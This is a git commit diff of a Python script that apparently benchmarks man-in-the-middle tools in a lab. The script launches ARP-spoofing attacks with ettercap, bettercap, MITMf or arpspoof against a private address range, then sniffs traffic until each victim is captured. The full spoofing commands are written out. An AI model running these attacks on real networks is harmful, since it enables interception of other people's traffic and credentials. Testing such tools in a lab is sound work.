a5583ddd99b69e997f393c312cb4904d920a5fed
Isac Cavalcante <isaccavalcante@alu.ufc.br>
2018-06-02 11:23:26 -0300

    Remove unused functions

--- run_test.py
+++ run_test.py
@@ -1,7 +1,12 @@
-from subprocess import Popen, PIPE
 from scapy.all import sniff
 import os
-import time
+import sys
+
+available_frameworks = ["ettercap", "bettercap", "mitmf", "arpspoof"]
+if len(sys.argv) <= 1 or sys.argv[1] not in available_frameworks :
+	help_message = "[-] Need to pass framework name as argument. Available frameworks: {}".format(available_frameworks)
+	print(help_message)
+	exit(1)
 
 EXTERNAL_ADDRESS = "192.168.1.10"
 GATEWAY_ADDRESS = "192.168.0.1"
@@ -21,31 +26,34 @@ def wait_all_victims(packet):
 	dst_addr = packet[0][1].dst
 	if src_addr in victims and dst_addr==EXTERNAL_ADDRESS:
 		victims.remove(src_addr)
-	if len(victims) == 0:
-		exit()
+	if len(victims) == 0: #captured all victims
+		exit(0)
 	
 def ettercap():
 	cmd = """
-	ettercap -Tq -M arp:remote /192.168.1.{}-{}// > /dev/null 2> /dev/null &
+	ettercap -Tq -M arp:remote /192.168.0.{}-{}// &
 	""".format(*IP_RANGE)
+	print(cmd)
+	os.system(cmd)
 
 
 def bettercap():
 	cmd = """ 
-	bettercap -eval "net.probe on; set arp.spoof.targets 192.168.0.{}-{}; arp.spoof on" > /dev/null 2> /dev/null  &
+	bettercap -eval "net.probe on; set arp.spoof.targets 192.168.0.{}-{}; arp.spoof on"  &
 	""".format(*IP_RANGE)
+	print(cmd)
 	os.system(cmd)
 	
 def mitmf():
 	""" This framework have bugs when you execute mitmf.py from outside it's directory. So make sure
-	you've copied the source, then cd to it. Also, it does not accept targets to be a range, like
+	you've copied the source, then cd to it. Also, it does not work when we pass a range of targets, like
 	`192.168.0.1-255`, but it does accept a comma separated list like `192.168.0.1,192.168.0.2`"""
 	targets = ""
 	for v in victims:
 		targets += v + ',' 
 	targets = targets.rstrip(',')
 	cmd = """
-	cd MITMf ; python2.7 mitmf.py -i eth0 --spoof --arp --target {} --gateway {} > /dev/null 2> /dev/null & 
+	cd MITMf ; python2.7 mitmf.py -i eth0 --spoof --arp --target {} --gateway {} & 
 	""".format(targets, GATEWAY_ADDRESS)
 	print(cmd)
 	os.system(cmd)
@@ -55,17 +63,15 @@ def dsniff():
 	echo 1 > /proc/sys/net/ipv4/ip_forward ;
 	for x in $(seq {} $(({}-1)) ) ;
 	do
-		arpspoof -t {} 192.168.0.$x  > /dev/null 2> /dev/null &
-		arpspoof -t 192.168.0.$x {}  > /dev/null 2> /dev/null &
+		arpspoof -t {} 192.168.0.$x & 
+		arpspoof -t 192.168.0.$x {} &
 	done
 	""".format(*IP_RANGE, GATEWAY_ADDRESS, GATEWAY_ADDRESS)
 	print(cmd)
 	os.system(cmd)
 
 def main():
-	#dsniff() 
-	#bettercap()
-	mitmf()
+	eval(sys.argv[1]+"()")
 	try:
 		sniff(filter="ip", prn=wait_all_victims)
 	except PermissionError:
